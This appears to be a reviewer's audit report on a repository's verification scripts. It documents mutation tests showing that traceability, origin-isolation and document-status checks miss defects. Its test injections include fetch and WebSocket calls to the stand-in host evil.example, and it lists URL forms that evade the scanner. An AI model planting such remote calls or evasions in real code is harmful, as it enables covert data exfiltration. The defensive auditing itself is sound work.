# `S0-9` — independent challenge: platform, evidence and closure (`RC-8`, `RC-9`)

**Challenger:** independent of every repair author. **Subject:** the worktree at `5923f51`, detached, `node_modules`
installed. No other branch, worktree, reflog entry or later commit was consulted. **Baseline established before any
mutation:** all eight gates green, 371 tests, 16/16 generators current (§4).

Every mutation below was applied to a file whose contents were held in memory and written back in a `finally`.
No `git checkout --` was used. The tree is clean at the end: `git diff HEAD` is empty and `git status` shows only the
pre-existing untracked `.install.log`.

---

## 1. Verdict table

| | 1 survival at tip | 2 causal ancestor | 3 preserves local theorems | 4 simpler repair | 5 actor authority | 6 crash/retry/concurrency | 7 named adversarial scenarios |
| --- | --- | --- | --- | --- | --- | --- | --- |
| **`RC-8`** closure-policy/evidence | ✓ all five defects read at `9edd930` | ✓ the umbrella is honest, not evasive | ✗ row 17 A1 and the generated profile agreed at the tip; the repair narrowed one and left the other byte-identical | ✗ two: matching `§15` instead of `§15 row N`, and deleting `originOf`'s punctuation filter | ✓ both new checkers sit in neither document; the CSP deferral is declared open | — pure single-shot read-only scanners; no persistent state | ✗ `P-5` falsifiers 3, 10, 13 and 14 are not met |
| **`RC-9`** later-gate governance | ✓ all four still unrepaired, as classified | ✓ self-declared a governance node, not an ancestor | ✓ nothing was repaired, so nothing was weakened | ✗ a toolchain-free source↔blob hash binding fits the already-wired `wasm:verify` | ✗ "later" is still a prose promise; the choice that would fix that is deferred to the gate whose authority is in question | — same | ✗ "stale blob fails normal CI" demonstrated unmet |
| **`S0-8`** traceability machinery | — new machinery, no prior defect | ✓ `RC-8C` is the right rule and is applied | ✗ the four carriers are published as equivalent; one has no liveness oracle at all | ✗ the `--check`/regenerate split makes the printed remedy the exploit | ✗ the population is a hand-written table with no oracle above it | — | ✗ 5 of `S0-8`'s own 19 mutations have a sibling it does not catch |

Six ✗ cells. The three that matter most, in order: **§3.1** (a sole falsifier that does not refuse its own finding's
defect), **§2.1** (a matrix that can be made to cite an unrelated artifact and stay green through every gate), and
**§3.2** (the archetypal font link the origin scanner was written for is invisible to it).

---

## 2. The traceability machinery

`S0-8`'s acceptance is *no shared producer inventory is the sole completeness oracle*, and `traceability.md` plus
`check-traceability.mjs` are what satisfy it. The design is genuinely good in one respect and hollow in two.

**What held.** The claim-at-the-evidence design is sound and I could not break the negative carrier. Removing a
finding's only claim is caught with a precise diagnosis (`T7a`). Two of `S0-8`'s three real liveness oracles are
real: a guard that stops running drops its claim from the regenerated file, and a test that leaves the run is
caught by `vitest list`. Those are not decorative.

### 2.1 The matrix can be made to cite an artifact that has nothing to do with the finding

The matrix proves *an artifact names this finding and runs*. It does not check any relationship between the
artifact and the defect. `S0-8` discloses that it does not prove **isolation** — a negative refusing for a second
reason. What I found is weaker than non-isolation: **non-relevance**. A negative that refuses only for an unrelated
reason satisfies everything.

I moved `f-5bd9552-origin-scan-static-forms`'s claim off `check-origin-isolation.mjs` and onto
`freshly-minted-package-under-an-attacker-root`, an HPKE package-root negative in `scripts/generate-package-vectors.mjs`:

```
pnpm vectors:check                exit=0   (the negative genuinely runs)
node scripts/check-traceability.mjs   →  85 claims, 27 of 28 current defects falsified
node scripts/check-traceability.mjs --check  exit=0  "traceability.md is current"

matrix row:
| `f-5bd9552-origin-scan-static-forms` | medium | S0-1 |
  `freshly-minted-package-under-an-attacker-root` (negative) | `scripts/generate-package-vectors.mjs` |
```

Fully consistent, fully green, and the matrix now asserts that a package-root rewrap negative refuses a static
origin-scan defect. `HANDOFF.md` calls the matrix *the shortest route from a finding to the artifact that refuses
it*. That sentence is false; it is the shortest route to an artifact that **names** it.

### 2.2 A check script's claim survives the script being gutted

The four carriers are published as equivalent, each with "what proves it still runs". For a check script that is
*the script is reachable from `pnpm check` or `pnpm build`* — implemented as `gated.includes(claim.where)`, a
substring test against the concatenated `package.json` command text. **Reachability is not liveness.** A script with
no assertions left is perfectly reachable.

I replaced the body of `scripts/check-selection-status.mjs` with a single `console.log` of its own success line,
keeping only the `falsifies:` docblock:

```
node scripts/check-selection-status.mjs   exit=0
node scripts/check-traceability.mjs --check
  → traceability: 85 claims, 27 of 28 current defects falsified, 2 declared owed. …is current.
```

The matrix is byte-identical. Nothing anywhere reports a problem. `f-tip-prd-stale-selection-status` is on the
*"where one artifact carries the whole demonstration"* list with this file as its only falsifier, so its entire
demonstration evaporates silently.

This is not a one-off: **three of the ten single-falsifier findings rest wholly on a check-script claim** —
`f-5bd9552-origin-scan-static-forms`, `f-tip-prd-stale-selection-status` and
`f-9b49b74-wasm-glue-key-nonce-lengths`. The other three carriers each have a real oracle; this one has none, and
the matrix presents all four in the same table as though they were the same strength.

### 2.3 The population is a hand-written table with no oracle above it

`S0-8` Stage A is the part it is proudest of: *the population is read three ways and all three must agree, because a
matrix that decides its own population is always complete.* The reconciliation checks **set membership only**. It
never checks a **class assignment** — and the class is what decides who needs a falsifier.

Moving `f-5bd9552-origin-scan-static-forms` from the closure table to the later-gate table in
`end-state-materiality.md` and regenerating:

```
node scripts/check-traceability.mjs
  → Wrote …: 85 claims over 27 findings, 26 of 27 current defects falsified.
node scripts/check-traceability.mjs --check   exit=0
```

No failure of any kind. A current closure defect became "waiting at its gate" by editing one markdown row. Two of
the three sources — `end-state-materiality.md` and the seven action READMEs — were written by this remediation;
only the findings directory predates it. So the phrase *read three ways* describes three readings of documents the
programme controls, two of which it authored, checked for set equality and nothing else.

Worse, the population can be **reduced**. Deleting a finding from the findings directory, the materiality table, its
owner README and its falsifier — four coordinated edits — regenerates cleanly:

```
node scripts/check-traceability.mjs --check   exit=0
  → 84 claims, 26 of 27 current defects falsified
pnpm review:check   exit=0   → "findings: 36 validated"
```

`review:check` recounts; it does not pin. `docs/review/config.json` pins `expected_source_count: 37` for the
**source manifest**, not for the finding population. Nothing in the repository asserts that there are 37 findings.

### 2.4 The printed remedy is the exploit

Three separate silent-drop and silent-inject paths are caught only as *staleness*, and the diagnosis is:

```
docs/review/remediation/traceability.md is stale. Run: node scripts/check-traceability.mjs
```

Running that command **accepts the drop or the forgery**. Concretely:

- **A hand-written vector file injects claims.** `readdirSync('test/vectors')` reads every `.json`; nothing checks
  that a vector file corresponds to a generator. I dropped in a `forged.json` whose `generated_by` names a real
  gated generator and whose `must_fail[].falsifies` names a real finding. `pnpm vectors:check` passes (each
  generator compares only its own output) and `pnpm vectors:coverage` still reports 190 AAD fields. After following
  the printed remedy: **86 claims, `--check` exit 0**, and the matrix cites `a-negative-nothing-generates` as a
  falsifier for `f-5bd9552`. An orphaned vector file left behind by a deleted generator has the same effect
  permanently, with nobody having intended it.
- **A tag written `//falsifies:` instead of `// falsifies:`** is neither read nor refused — the `ANY_TAG` audit
  `S0-8` added as mutations 16–18 matches the same one-space form the reader does, so it cannot see a variant.
  Claims drop 85 → 84; the headline stays *27 of 28*; the remedy blesses it.

### 2.5 The silent-drop audit cannot see a file it never opened

`S0-8`'s best self-catch was mutations 16–18: *each scanner now compares what is offered against what it could
attach, and refuses the difference*. That audit runs only over files the scanner already enumerated, and neither
enumeration recurses:

- `readdirSync('test/')` — a `// falsifies:` tag in `test/sub/orphan.test.ts` is invisible. `--check` exit 0.
- `readdirSync('scripts/')` — a `falsifies:` docblock line in `scripts/lib/webauthn.mjs` is invisible. `--check`
  exit 0. That is the file the WebAuthn embedding policy actually lives in, and a plausible place to write the claim.

*A check that classifies by matching a list silently passes whatever the list does not name* — `S0-1`'s subject,
appearing a fifth time, in the file written to prove `S0-1`'s repairs, at the level of **which files exist** rather
than which lines match.

### 2.6 What the matrix should say instead

The honest statement of what `check-traceability.mjs` proves is: *for every current defect, some file names it, and
that file is either reachable from a gate or contributes to a regenerated artifact.* It proves nothing about
whether the named file tests the defect, and for the script carrier it proves nothing about whether the file tests
anything at all.

---

## 3. Every ✗ and every doubt, in detail

### 3.1 `f-tip-prd-stale-selection-status`: the sole falsifier does not refuse the finding's own defect

**This is the most serious finding in the challenge**, because it is the experiment `S0-9` exists to run.

`traceability.md` credits exactly one falsifier: `check-selection-status.mjs`. The finding names three passages at
`9edd930:docs/PRD.md` — lines 1133–1137, 1248–1253 and 2024–2029. I restored those exact documents and ran the
repaired checker against them.

```
# tip PRD + tip TRD
node scripts/check-selection-status.mjs   exit=1
  - TRD §15 says "Eighteen rows are selected" and §15.1 lists 17.
  - TRD §15 refers to "eighteen selected" rows and §15.1 lists 17.
  - TRD §15 refers to "eighteen selected" rows and §15.1 lists 17.

# tip PRD + current (repaired) TRD register  ← the finding's exact defect, isolated
node scripts/check-selection-status.mjs   exit=0
  selection status: 17 selected and 4 unselected rows, disjoint;
  3 PRD sentences cite a row and none contradicts the register.
```

**Exit 0. "None contradicts the register."** All three stale passages are present and all three are invisible. The
failure in the first run is a *different* defect — the "eighteen rows are selected" arithmetic error `S0-1` found
while writing the check, which is not this finding.

The reason is exact. The check requires `§15 row (\d+)` in the same sentence as the open-vocabulary, and the tip's
stale prose does not have it:

- row 11: *"TRD §13.6 fixes the two gates and **TRD §15 carries the choice as an open row**."* — `§15`, no row number.
- row 5: *"**TRD §15 leaves the choice open** as one of the rows to close first."* — `§15`, no row number.
- row 14: the row citation is in the sentence that says *selected*; *"Step-up authentication and confirmation UX
  remain open"* is a separate sentence naming no row.

So this is a **regression guard for the document edit that fixed the finding, not a falsifier for the finding**.
`S0-1`'s README says the document edit came first and *"what it still owes is the oracle"*. The oracle was built and
it does not cover the defect. Under `traceability.md`'s own standard — *a finding whose falsifier this cannot resolve
was never closed, it was asserted* — this finding is asserted.

I also mapped the check's live coverage. The PRD contains **five** sentences citing `§15 row N`, covering rows 5, 11,
13, 14 and 16. The register has 21 rows. **For 16 of 21 rows the PRD→register direction is vacuous.** And within the
five, the classifier drops ordinary English (each injected into the PRD, `check-selection-status.mjs` run, then
restored):

| Injected sentence | Result |
| --- | --- |
| `TRD §15 row 5 is still open.` | **CAUGHT** |
| `TRD §15 row 5 remains open, although the wrapping format is selected.` | **MISSED** — one sentence carrying both an open word and a settled word is exempt from both tests |
| `The wrapping format (TRD §15 row 5) has not been chosen yet.` | **MISSED** |
| `TRD §15 row 5 is TBD.` | **MISSED** |
| `We have yet to decide TRD §15 row 5.` | **MISSED** |
| `The format is selected. §15 row 5 is still open.` | **MISSED** — `§` is not in the sentence-splitter's lookahead class, so the two sentences merge and the merged one carries both words |

The docblock declares one limit (a paragraph with no citation). It does not declare the vocabulary limit, the
both-words exemption, or the splitter. `P-5` falsifier 13 — *"A PRD subsection calling a selected row open fails"* —
is not met.

**Simpler repair, and it is strictly stronger.** The defect is prose calling a closed row open near a `§15`
reference. Matching **`§15`** rather than `§15 row N`, and reading the paragraph rather than the sentence, catches
all three tip passages — because all three say `TRD §15`. That is a smaller regex and a larger oracle. The repair
chose the narrower key and then added citations to the PRD so the narrow key would find something, which makes the
check's coverage a function of the repair's own edits.

### 3.2 `f-5bd9552-origin-scan-static-forms`: the archetypal font link is invisible

Twelve injections into `dist/`, each run through `node scripts/check-origin-isolation.mjs`, each restored:

| Injected into built output | Result |
| --- | --- |
| `fetch("https://evil.example/x")` | **CAUGHT** — the repair's headline case |
| `fetch('https://evil.example/x')` | **CAUGHT** |
| ``fetch(`https://evil.example/x`)`` | **MISSED** — backtick is outside `ANY_URL`'s exclusion class, so the match swallows it and `originOf` discards on punctuation |
| `new WebSocket("wss://evil.example/s")` | **CAUGHT** |
| `<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400">` | **MISSED** |
| `fetch("https://analytics.evil.example/c?q=a+b")` | **MISSED** |
| `fetch("https://evil.example/a$b")` | **MISSED** |
| a URL present only in the shipped `index-*.js.map` | **MISSED** — `.map` is not in `SCANNED` |
| protocol-relative, assembled, dotless host | MISSED — **all three declared** in the docblock |

The fifth row is the result that matters. `originOf` returns `null` for any URL containing `` ` ``, `$`, `+` or `\`.
**`+` is the character Google Fonts uses to join family names**, so the canonical stylesheet link is silently
dropped from both the violation path and the `mentions` count. The docblock says *"A font link was the case it was
written for and the case it caught."* It does not catch this one.

The printed conclusion is *"no literal remote URL in built output, allowlisted namespace identifiers aside"*. A
no-substitution template literal is a literal. A URL with a `+` in it is a literal. **The claim is still larger than
the check**, which is the finding's exact charge, after a repair whose stated purpose was to make the two the same
size.

**Simpler repair.** `originOf`'s punctuation filter is a survivor of the pre-inversion design, kept for a reason
that the inversion removed. It existed to suppress *mention* noise from minified template splices when the
distinction between fetching and mentioned still decided the outcome. Under allowlist-by-default that distinction
is gone: the policy is one entry per remote origin with a reason, and the measured cost of the whole inversion was
**one** entry. Extracting a host-shaped token directly — the `HOSTLIKE` test already present — instead of parsing a
URL and discarding on punctuation is simpler code and strictly more coverage. Nobody re-derived whether the filter
was still needed after the default flipped.

### 3.3 The row-17 A1 control drifted from its own generated profile

`docs/selections/row-17-web-security-baseline.md` line 174, after `S0-1` Stage C:

> **No remote origin referenced in built output**, allowlisted namespace identifiers aside.

`test/vectors/web-security-baseline.json`, the generated artifact §13.11 level 2 designates as *the recorded
profile*, addendum entry A1 — **byte-identical to `9edd930`**:

> No remote subresource in the key-holding origin. Not "with SRI" — none.

and its `verification` string, also unchanged: *"A1 is verified now, by scripts/check-origin-isolation.mjs inside
`pnpm build`."*

So the recorded profile still publishes the unnarrowed universal claim and still credits the narrowed scanner with
verifying it. `ADDENDUM` is a hardcoded literal array in `scripts/generate-baseline-vectors.mjs`, which reads the
TRD and the pinned ASVS index and **never reads `row-17-web-security-baseline.md`**, despite its own docblock
opening *"The construction is specified in docs/selections/row-17-web-security-baseline.md. This script is the
executable half of that document."* Its only A1 check is that the named file exists on disk — file presence, not
claim agreement, the same reachability-not-liveness weakness as §2.2.

This is `f-992bc91-network-carrier-registry-stale`'s shape — a generated inventory drifting from the document under
a green check — reproduced by the action repairing an overclaim, in a row that action edited. `HANDOFF.md` warns
about exactly this: *"`pnpm vectors:check` cannot see document drift… If you amend a row, the matching generator
change is owed in the same action."* Row 17 was amended in Stage C; the generator change was not made. It is the
`RC-8` failure axis 3 asks about: an agreement that held at the tip and does not hold now.

### 3.4 The `none` hatch `P-5` says it closed is still open

`P-5`: *"a `none` role whose primitive is not literally none is refused, because otherwise `none` is a hatch for
hiding a primitive from the check exactly as `both` was."* The implementation tests a prefix: `/^none\b/iu`.

Mutations to `SUITE_1`, running `node scripts/generate-suite-vectors.mjs`:

| `path: 'none'` with primitive | Result |
| --- | --- |
| `'XChaCha20-Poly1305'` | **CAUGHT** |
| `'None, but XChaCha20-Poly1305 for the seal'` | **MISSED** |
| `'none: AES-256-GCM'` | **MISSED** |

Either missed form hides a real primitive — including the one synchronous primitive the whole separation argument
rests on — from `checkSeparation`. The loose form is not hypothetical: the shipped data already uses
`'None. HKDF-SHA-256 only'`, a string that names a real primitive after the word *None*, so the pattern an author
would copy is the one that defeats the guard. `P-5` falsifier 3 is not met as stated.

**What held on this finding.** The core repair is sound and I could not break it. `checkSeparation` is a genuine
total classification — a `switch` with a throwing `default`. `both` is caught and the message names the rule rather
than the enum; `'Async'`, `'sync '` and an omitted `path` key are all caught with the *unclassified role* diagnosis.
`P-5` falsifiers 1 and 2 are met exactly.

### 3.5 `f-b9ff071-webauthn-cross-origin-policy` held

I could not break this one and record that as a result. Survival at tip is clean: `9edd930:scripts/lib/webauthn.mjs`
line 70 hardcodes `crossOrigin: false` into the serialization with no `topOrigin` and no policy function. The
repair's two negatives are genuinely separated in both generators — `crossOrigin: true` with no `topOrigin`, and
`topOrigin` present with `crossOrigin: false` — so neither passes with only one of the two checks present, which is
the trap `P-5` names and avoids. The omitted-member case is asserted separately. The only hardening note is that
`cd.crossOrigin === true` is strict, so a non-conforming agent emitting `"crossOrigin": "true"` reads as false; per
the specification client data is user-agent-produced, and a real cross-origin ceremony must also carry `topOrigin`,
which is refused outright. I do not think this is material.

### 3.6 `f-bd87655-x25519-support-floor-omitted`: the owed debt contradicts the TRD about when it is owed

Survival at tip is clean — `9edd930` §10.11 reads *"Three such statements follow"* and never mentions X25519. The
repair is substantial and honest: a fourth statement, the four exact `SubtleCrypto` operations, a refusal-at-the-
capability-check absence behaviour, and a deliberately empty evidence table.

But the two artifacts disagree about the deadline. TRD §10.11:

> A dated `SubtleCrypto` readback of the four operations above, across the four core engines, **is required before
> Stage 0 closes**.

`check-traceability.mjs`'s `OWED` entry and `traceability.md` both record it as **owed to `L-4`** — after Stage 0,
after `S0-10`. The normative document makes it a Stage 0 blocker and the closure artifact defers it past closure.
Nothing checks this: `check-selection-status.mjs` reads only §15 rows and `trace:check` never reads §10.11. `S0-10`
should not record Stage 0 closure while §10.11 says an unmet condition blocks it.

**The expiry discipline `P-5` selected has no implementation.** §10.11 states the rule twice — *source, date and
expiry*, with *an expired observation failing at the gate that consumes it*. No dated table in §10.11 carries an
expiry column, and `grep -rn "expir" scripts/` finds nothing but retention semantics. `P-5` falsifier 14 — *"An
external observation without a date or an expiry fails at the gate that reads it"* — is unmet in both halves: no
observation carries an expiry, and no gate reads one.

### 3.7 `RC-9`: "later" is still a prose promise, and one ready check is wired to nothing

`RC-9`'s own diagnosis names the failure precisely: *"The failure would be allowing 'later' to remain a prose
promise rather than a release-blocking state with evidence readback."* That is the current state, and the axis-5
answer is unambiguous.

- **No `RC-9` decision was taken.** `decisions/` holds `P-1`–`P-6` and `P-8`. `remediation-options.md` defines
  `RC-9` Branch A (central gate manifest) and Branch B (stage-local signed receipts) and a decision packet requiring
  the chosen branch to be *"mechanically release-blocking, hash its inputs, name expiry/waiver authority"*.
  `action-tree.md` line 706 makes choosing between them a **prerequisite of `L-4` itself**. The gate that must block
  is the gate that decides whether it blocks.
- **`HANDOFF.md` says "Outstanding decisions: none."** That is contradicted by line 706 in the file it points at.
  The choice was not made; it was relocated.
- **Nothing mechanically blocks.** `check-traceability.mjs`'s `OWED` array fails only when a debt is *paid and not
  struck* — the vacuity guard. It never fails when a gate arrives unmet, has no deadline, no owner, no expiry and no
  hashed inputs. `traceability.md`'s "Waiting at its gate" is a rendered markdown cell.

**Demonstration for `f-9b49b74-wasm-source-artifact-drift-unchecked`.** `RC-9`'s named falsifier is *stale blob
fails normal CI*. I edited the reviewed Rust source without rebuilding the shipped blob:

```
# appended to wasm/journal-seal/src/lib.rs:
#[no_mangle] pub extern "C" fn s09_probe() -> u32 { 7 }

pnpm wasm:verify   (in `pnpm check`)   exit=0
  → journal seal: 15 checks pass — the published KAT, 4 composition vectors, …
pnpm wasm:stale    (in NO gate)        exit=1
  → wasm/journal-seal/seal.generated.ts is stale — re-run: …
```

The check that would catch it exists, works, and is reachable from no gate. `package.json`'s `check` runs
`wasm:verify` and not `wasm:stale`.

**The simpler repair I tried and rejected, and the one that survives.** I expected "add `wasm:stale` to `check`" to
be a one-line repair. It is not: `build-wasm-seal.mjs` shells out to `cargo build --release --target
wasm32-unknown-unknown`, and `check-wasm-seal.mjs`'s docblock gives toolchain-freedom as the reason it can sit
inside `pnpm check`. That attack failed and the deferral is defensible. What survives is smaller: `seal.generated.ts`'s
header records the byte count and **no hash of `src/lib.rs`, no `Cargo.lock` hash, no toolchain version**. Recording
those in the generated header and comparing them in the already-wired, toolchain-free `wasm:verify` would fail the
mutation above — binding reviewed source to shipped bytes for the case where either is edited alone, which is the
finding's named failure, without adding Rust to CI. That is materially simpler than a governance branch and was not
considered.

**The other three `RC-9` findings are untouched and correctly so.** `f-9860a0b-legacy-plaintext-repair-undefined`,
`f-9b49b74-rustcrypto-audit-version-gap` and `f-bd87655-baseline-not-performance-floor` need integrated
implementations that do not exist at Stage 0. Deferral is right; only its enforceability is not.

### 3.8 The CSP the narrowed claim leans on does not exist anywhere

`P-5` §3 selects `default-src 'self'`, `connect-src 'self'`, `frame-ancestors 'none'` as the runtime control for the
residual, and both the origin scanner and `webauthn.mjs` name it as what covers what they cannot. Searching
`scripts/ src/ index.html public/ test/ relay/ vite/` for those directives returns **only prose** — docblocks and
one vector `why` string. There is no header, no `<meta http-equiv>` in `index.html` or `dist/index.html`, and no
serving configuration.

This is *declared* — `row-17-web-security-baseline.md` lists "CSP's actual directive set" as open and Stage 4 — so
axis 5 holds. But it means the residual named in §3.2 (template literals, `+`-bearing URLs, protocol-relative,
assembled) currently has **no control at all**, static or runtime, and the generated profile's A1 entry (§3.3) says
the control is verified now. `RC-9`'s shape, inside `RC-8`'s repair.

### 3.9 The umbrella is honest, and its scope has one hole

Axis 2 asks whether *umbrella* is a way of avoiding five separate diagnoses. It is not: `P-5` takes four distinct
policy decisions plus a representation decision, each with its own argument and falsifiers, and the causal record
states plainly that the five divergences *"do not have one demonstrated producer-inventory cause"*. That is a real
diagnosis, not an evasion.

The hole is in scope rather than in honesty. `RC-8`'s document-authority lane is instantiated as `a073574`/`ff0b48f`
closing TRD rows without updating the PRD, and the repair built a checker for that pair. The **same lane** between a
selection row and its generated profile was never enumerated, and §3.3 is that instance, live.

---

## 4. What I ran

All commands from `/Users/thomasingalls/Code/done/.claude/worktrees/s09-platform`.

**Baseline, before any mutation, and again after every mutation was restored — identical both times:**

| Gate | Exit | Output |
| --- | --- | --- |
| `pnpm vectors:check` | 0 | 16 generators current; `190 AAD fields, each isolated by a published negative.` |
| `pnpm retention:check` | 0 | 12 months across 6 anchors; 5 states, 6 deletion classes |
| `pnpm status:check` | 0 | `17 selected and 4 unselected rows, disjoint; 5 PRD sentences cite a row` |
| `pnpm limit:check` | 0 | `0.0476 µs/byte from 3 measurements; exhausted at 19.6 kB` |
| `pnpm trace:check` | 0 | `85 claims, 27 of 28 current defects falsified, 2 declared owed` |
| `pnpm wasm:verify` | 0 | `15 checks pass` |
| `pnpm review:check` | 0 | `findings: 37 validated`; `work: 16 complete`; `ready: none` |
| `pnpm wasm:stale` | 0 | `generated module matches the crate (6465 B wasm)` |
| `pnpm test` | 0 | **36 files, 371 tests passed** |
| `pnpm build` | 0 | budget 306.3/350.0 kB; `origin isolation: scanned 6 built files` |

`pnpm check` was not run whole: it begins with `pnpm lint` and `pnpm format`, which `HANDOFF.md` records as failing
at the pinned base on files unrelated to any repair. Every member of `check` that is not `lint`/`format` was run
individually, above.

**Mutation batteries.** Four harnesses, in the scratchpad, each snapshotting file contents into a `Map` before the
first mutation and writing them back in a `finally`, then re-running the affected gate to prove restoration:

- `origin-attack.mjs` — 12 injections into `dist/` against `check-origin-isolation.mjs` (§3.2).
- `trace-attack.mjs`, `trace-attack2.mjs`, `trace-attack3.mjs` — 10 mutations against `check-traceability.mjs` (§2).
- `s01-attack.mjs`, `s04.mjs` — 5 suite-separation and 7 PRD-status mutations (§3.1, §3.4).
- `rc9.mjs` — the Rust-source/blob drift demonstration (§3.7).

**Tip reads** (`git show 9edd930:<path>`, never the finding's prose): `scripts/generate-suite-vectors.mjs`
(`path: 'both'` at line 134, `filter((r) => r.path === want)` at line 356), `scripts/lib/webauthn.mjs` (line 70,
`crossOrigin: false` hardcoded), `scripts/check-origin-isolation.mjs` (`ALLOWED_ORIGINS = []`, the mention branch,
the *first-party only* conclusion), `docs/TRD.md` §10.11 (*"Three such statements"*, no X25519),
`docs/PRD.md` lines 1133–1137/1248–1253/2024–2029, `test/vectors/web-security-baseline.json` (A1 byte-identical).

**Final state:** `git diff HEAD` empty; `git status --short` shows only the pre-existing untracked `.install.log`;
all eight gates and the 371 tests green.

---

## 5. What I could not check, and why

- **Isolation of the 53 negative claims.** `S0-8` says the matrix does not prove a falsifier isolates and points at
  `pnpm vectors:coverage` and the per-action mutation batteries. `vectors:coverage` is real and passes — 190 AAD
  fields, each elided and required to stop a negative failing. I verified it runs; I did not re-derive it, and it
  covers AAD fields only. The per-action batteries are `RC-1`–`RC-7` work and belong to the other cluster
  challenges.
- **Axis 6, crash/retry/concurrency**, is genuinely not reachable here rather than unexamined. Every artifact in
  this cluster is a single-shot read-only scanner with no persistent state, no locking and no retry. The one
  stateful behaviour is `check-traceability.mjs`'s write mode, and its hazard (§2.4) is a workflow property, not a
  crash property.
- **Whether the CSP directives, once deployed, actually cover §3.2's residual.** That needs a served response and is
  `L-4`'s readback by construction.
- **The four historical-only findings and the `H-1` ledger** — outside this cluster.
- **`f-66a7c6a`'s append burst and `f-bd87655`'s dated table** are the two declared debts. I checked that both are
  declared rather than hidden, and that `check-traceability.mjs`'s vacuity guard would fail if either were paid and
  left declared. I did not attempt to discharge either; both need sources external to this repository.
- **Playwright suites** (`pnpm test:geometry`, `test:latency`) were not run; no claim in this cluster is carried by
  them, and `check-traceability.mjs` deliberately excludes `test/latency/journal-bench.ts` for exactly that reason.

---

## 6. What this means for closure

Nothing here forces a design change. Every ✗ is an **evidence** defect, which is what makes them the ones `S0-10`
cannot record over: the programme's stated recurring failure is *a check that passes while proving less than it
claims*, and six instances of it survive inside the repairs written to end it.

The three that should block `S0-10` as it stands:

1. **`f-tip-prd-stale-selection-status` is not falsified** (§3.1). Its sole credited falsifier returns exit 0 on
   the exact documents the finding describes. Either the check matches `§15` and reads paragraphs, or the finding is
   recorded as repaired-by-edit with the oracle owed — but it cannot be counted among the 27.
2. **The A1 drift** (§3.3) is a live instance of `f-992bc91`'s pattern in an artifact `S0-1` edited, and one string
   in `generate-baseline-vectors.mjs` fixes it.
3. **§10.11 says the X25519 readback blocks Stage 0 closure** while the closure artifact defers it to `L-4` (§3.6).
   One of the two must move before `S0-10` records closure.

And the matrix's own description should shrink to what it proves (§2.6). It is a good artifact — generated, read
back, honest about isolation. It is not a route from a finding to the artifact that refuses it, and three of the ten
findings it says rest on a single falsifier rest on a carrier with no liveness oracle at all.
